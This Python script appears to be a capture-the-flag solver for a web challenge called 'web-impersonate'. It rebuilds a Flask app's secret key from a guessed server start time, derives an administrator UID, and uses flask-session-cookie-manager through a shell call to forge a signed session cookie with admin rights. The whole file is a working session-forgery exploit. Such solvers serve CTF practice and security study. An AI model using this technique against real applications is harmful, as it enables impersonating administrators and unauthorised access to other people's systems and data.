# !/usr/bin/env python3
import uuid
import os
import subprocess
from datetime import datetime, timedelta
import hashlib

def solver():
    # get the uid
    secret = uuid.UUID('31333337-1337-1337-1337-133713371337')
    uid = uuid.uuid5(secret, 'administrator')
    # uid = "test12345"

    # get the start time for the server
    server_start_time_raw = datetime(2024, 9, 21, 21, 0, 14)       # insert whatever you find out
    server_start_str = server_start_time_raw.strftime('%Y%m%d%H%M%S')
    secure_key = hashlib.sha256(f'secret_key_{server_start_str}'.encode()).hexdigest()

    ################################################
    #### create the "user" cookie #########
    ################################################
    cookie_format = f'{{\"is_admin\":\"true\",\"uid\":\"{str(uid)}\",\"username\":\"administrator\"}}'
    print(cookie_format)

    # start our python environment
    python_env = "~/Python\\ Envs/web-impersonate/bin/activate" # use whatever you have here 
    start_python_env = f'source {python_env} '
    print(start_python_env)

    # run the flask session encoder script
    flask_manager_script = "~/Misc_Tools/flask-session-cookie-manager/flask_session_cookie_manager3.py"
    flask_call = f'python3 {flask_manager_script} encode -s \'{secure_key}\' -t \'{cookie_format}\''
    print(flask_call)

    # solution = f'{start_python_env} && {flask_call}'
    solution = f'{start_python_env}; {flask_call}'
    process = subprocess.Popen(solution, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, executable="/bin/bash")
    output, errors = process.communicate()

    print("Output:")
    print(output.decode('utf-8'))

    if errors:
        print("Errors:")
        print(errors.decode('utf-8'))

if __name__=='__main__':
    # print("Running test shell now")
    # test_string = f"ls ~/Python\\ Envs/web-impersonate/bin"
    # process = subprocess.Popen(test_string, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, executable="/bin/bash")
    # output, errors = process.communicate()
    # print("Test Output:")
    # print(output.decode('utf-8'))
    print("Running real solution now")
    solver()





